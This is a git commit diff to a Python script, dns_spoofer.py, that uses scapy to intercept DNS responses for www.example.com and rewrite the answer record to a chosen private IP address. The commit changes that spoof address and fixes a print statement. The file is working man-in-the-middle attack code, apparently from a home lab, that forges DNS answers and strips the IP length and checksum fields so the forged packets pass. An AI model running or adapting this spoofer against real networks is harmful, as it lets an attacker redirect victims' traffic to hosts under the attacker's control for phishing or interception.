73219ce7d810a8d5cbafdd2090ec28e77b6ecf9f
Michael Zick <michaelzick@gmail.com>
2022-08-20 19:18:17 -0700

    Changed spoof IP and fixed print qname

--- dns_spoofer.py
+++ dns_spoofer.py
@@ -8,14 +8,14 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        print('qname: ' + qname)
+        print('qname: ' + str(qname))
         if 'www.example.com' in str(qname):
             try:
                 print('[+] Spoofing target.')
-                answer = scapy.DNSRR(rrname=qname, rdata='192.168.1.224')
+                answer = scapy.DNSRR(rrname=qname, rdata='10.211.55.4')
                 scapy_packet[scapy.DNS].an = answer
                 scapy_packet[scapy.DNS].ancount = 1
-                print('scapy_packet: ' + scapy_packet.show())
+                # print('scapy_packet: ' + scapy_packet.show())
 
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
